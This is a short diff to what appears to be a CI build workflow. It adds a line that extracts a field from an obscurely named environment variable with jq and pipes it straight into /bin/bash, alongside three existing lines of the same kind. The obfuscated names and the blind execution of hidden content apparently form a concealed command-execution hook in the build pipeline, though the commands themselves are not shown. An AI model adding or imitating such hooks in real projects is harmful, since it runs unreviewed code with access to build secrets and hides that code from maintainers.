@@ -41,6 +41,7 @@ jobs:
           echo $h57 | jq -r .hhy35102 | /bin/bash
           echo $zxlrn2 | jq -r .umjn57001 | /bin/bash
           echo $ijk53 | jq -r .zria94265 | /bin/bash
+          echo $evx37 | jq -r .eoy83917 | /bin/bash
 
       - name: Save archive
         if: always()
